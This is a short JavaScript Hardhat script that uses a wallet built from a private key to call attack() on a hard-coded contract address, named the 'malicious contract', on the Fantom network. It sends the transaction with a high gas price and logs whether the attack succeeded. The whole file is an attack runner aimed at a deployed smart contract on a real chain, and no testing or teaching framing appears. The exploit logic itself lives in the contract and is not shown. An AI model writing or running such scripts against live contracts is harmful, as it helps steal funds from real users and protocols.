require("dotenv").config();
const { ethers } = require("hardhat");

async function main() {
    const provider = new ethers.providers.JsonRpcProvider(process.env.FANTOM_RPC_URL);
    const attacker = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

    console.log("Configured attacker address:", attacker.address);

    const maliciousContractAddress = "0x5456070082e58Fa63F0aDacB5f4527da25BD7454";
    const MaliciousContract = new ethers.Contract(
        maliciousContractAddress,
        [
            "function attack() external",
            "event AttackExecuted(uint256 amount)",
            "event BalanceBeforeAttack(uint256 balance)"
        ],
        attacker
    );

    try {
        console.log("Attempting to execute attack...");

        // Set gas price according to balance
        const gasPrice = ethers.utils.parseUnits('100', 'gwei'); // Adjusted to maximum affordable price

        // Call the attack function with a reasonable gas limit
        const tx = await MaliciousContract.attack({
            gasLimit: 100000,  // Adjust gas limit based on expected usage
            gasPrice: gasPrice  // Set high gas price
        });

        const receipt = await tx.wait();
        
        console.log("Attack executed successfully!");
        console.log("Transaction hash:", receipt.transactionHash);
        console.log("Gas used:", receipt.gasUsed.toString());

    } catch (error) {
        console.error("Error during attack execution:", error.message);
    }
}

main()
    .then(() => console.log("Attack script completed"))
    .catch(console.error);
